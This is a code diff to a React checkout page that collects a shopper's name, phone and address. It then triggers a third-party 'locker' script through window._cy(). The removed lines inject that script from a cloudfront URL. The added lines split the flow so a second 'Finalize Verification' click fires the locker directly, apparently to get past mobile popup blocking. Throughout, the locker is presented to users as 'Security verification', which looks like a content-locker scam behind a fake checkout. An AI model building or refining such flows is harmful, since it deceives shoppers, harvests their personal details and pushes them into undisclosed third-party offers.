@@ -1,5 +1,5 @@
 
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { ArrowLeft, Lock } from 'lucide-react';
 import { Button } from './Button';
 
@@ -16,37 +16,11 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ product, onBack, onC
     address: ''
   });
 
-  // Inject locker scripts on mount
-  useEffect(() => {
-    const loadLockerOnce = () => {
-      const configScriptId = 'locker-config';
-      const mainScriptId = 'locker-script-main';
+  const [isValidated, setIsValidated] = useState(false);
 
-      // 1. Inject Config Script
-      if (!document.getElementById(configScriptId)) {
-        const scriptConfig = document.createElement('script');
-        scriptConfig.id = configScriptId;
-        scriptConfig.type = 'text/javascript';
-        scriptConfig.innerHTML = 'var okhVP_WpH_rdSDFc = { it: 4576806, key: "e8993" };';
-        document.body.appendChild(scriptConfig);
-      }
-
-      // 2. Inject Main Script
-      if (!document.getElementById(mainScriptId)) {
-        const script = document.createElement('script');
-        script.id = mainScriptId;
-        script.src = 'https://da4talg8ap14y.cloudfront.net/a65adcc.js';
-        script.async = true;
-        document.body.appendChild(script);
-        console.log("Locker script injected");
-      }
-    };
-
-    loadLockerOnce();
-  }, []);
-
-  const handleConfirmClick = (e: React.MouseEvent) => {
-    // Prevent default form behavior/reload
+  // STEP 1: Validate Fields Only
+  // This function prepares the UI for the second step but does NOT call the locker.
+  const handleValidateDetails = (e: React.MouseEvent) => {
     e.preventDefault();
     
     // 1. Validate fields
@@ -55,31 +29,22 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ product, onBack, onC
       return;
     }
 
-    // 2. Trigger Logic: Check for _cy immediately, or poll for it
-    if (typeof (window as any)._cy === 'function') {
-      console.log("Locker ready");
-      (window as any)._cy();
-      return;
-    }
+    // 2. Move to Step 2
+    setIsValidated(true);
+  };
 
-    // Poll for the locker function if it hasn't loaded yet
-    let attempts = 0;
-    const maxAttempts = 30; // 3 seconds total (30 * 100ms)
-    
-    const interval = setInterval(() => {
-      if (typeof (window as any)._cy === 'function') {
-        clearInterval(interval);
-        console.log("Locker ready");
-        (window as any)._cy();
-      } else {
-        attempts++;
-        if (attempts >= maxAttempts) {
-          clearInterval(interval);
-          console.error("Locker script not loaded: _cy is undefined");
-          alert("Security verification is still loading. Please wait a moment and try again.");
-        }
-      }
-    }, 100);
+  // STEP 2: Trigger Locker
+  // This function MUST NOT contain validation logic or async delays to work on mobile.
+  const handleTriggerLocker = (e: React.MouseEvent) => {
+    e.preventDefault();
+
+    if (typeof (window as any)._cy === 'function') {
+      // Direct call required for mobile browsers
+      (window as any)._cy();
+    } else {
+      console.error("Locker script not loaded");
+      alert("Security verification is still loading. Please wait a moment and try again.");
+    }
   };
 
   if (!product) return null;
@@ -129,8 +94,7 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ product, onBack, onC
               <p className="text-gray-400 text-sm">Where should we send your item?</p>
             </div>
 
-            {/* Use preventDefault on form to ensure Enter key doesn't reload, 
-                though Button type="button" handles click safely */}
+            {/* Use preventDefault on form to ensure Enter key doesn't reload */}
             <form onSubmit={(e) => e.preventDefault()} className="space-y-6">
               <div>
                 <label htmlFor="fullName" className="block text-sm font-medium text-gray-300 mb-2">
@@ -140,9 +104,10 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ product, onBack, onC
                   type="text"
                   id="fullName"
                   required
+                  disabled={isValidated} // Lock inputs after validation
                   value={formData.fullName}
                   onChange={(e) => setFormData({...formData, fullName: e.target.value})}
-                  className="w-full bg-gray-900/50 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all"
+                  className="w-full bg-gray-900/50 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                   placeholder="Enter your full name"
                 />
               </div>
@@ -155,9 +120,10 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ product, onBack, onC
                   type="tel"
                   id="phone"
                   required
+                  disabled={isValidated}
                   value={formData.phone}
                   onChange={(e) => setFormData({...formData, phone: e.target.value})}
-                  className="w-full bg-gray-900/50 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all"
+                  className="w-full bg-gray-900/50 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                   placeholder="Enter your phone number"
                 />
               </div>
@@ -169,22 +135,35 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ product, onBack, onC
                 <textarea
                   id="address"
                   required
+                  disabled={isValidated}
                   rows={4}
                   value={formData.address}
                   onChange={(e) => setFormData({...formData, address: e.target.value})}
-                  className="w-full bg-gray-900/50 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all resize-none"
+                  className="w-full bg-gray-900/50 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all resize-none disabled:opacity-50 disabled:cursor-not-allowed"
                   placeholder="Street address, city, state, zip code"
                 />
               </div>
 
               <div className="pt-4">
-                <Button 
-                  type="button" 
-                  onClick={handleConfirmClick}
-                  className="w-full py-4 text-lg shadow-primary/25 hover:shadow-primary/40"
-                >
-                  Confirm & Reserve My Item
-                </Button>
+                {!isValidated ? (
+                  /* STEP 1: VALIDATION BUTTON */
+                  <Button 
+                    type="button" 
+                    onClick={handleValidateDetails}
+                    className="w-full py-4 text-lg shadow-primary/25 hover:shadow-primary/40"
+                  >
+                    Confirm & Reserve My Item
+                  </Button>
+                ) : (
+                  /* STEP 2: LOCKER BUTTON (Must be direct click) */
+                  <Button 
+                    type="button" 
+                    onClick={handleTriggerLocker}
+                    className="w-full py-4 text-lg shadow-primary/25 hover:shadow-primary/40 animate-in fade-in zoom-in duration-300"
+                  >
+                    Click Here to Finalize Verification
+                  </Button>
+                )}
                 
                 <div className="mt-4 flex items-start gap-2 text-xs text-gray-500 justify-center text-center">
                   <Lock className="w-3 h-3 mt-0.5 flex-shrink-0" />
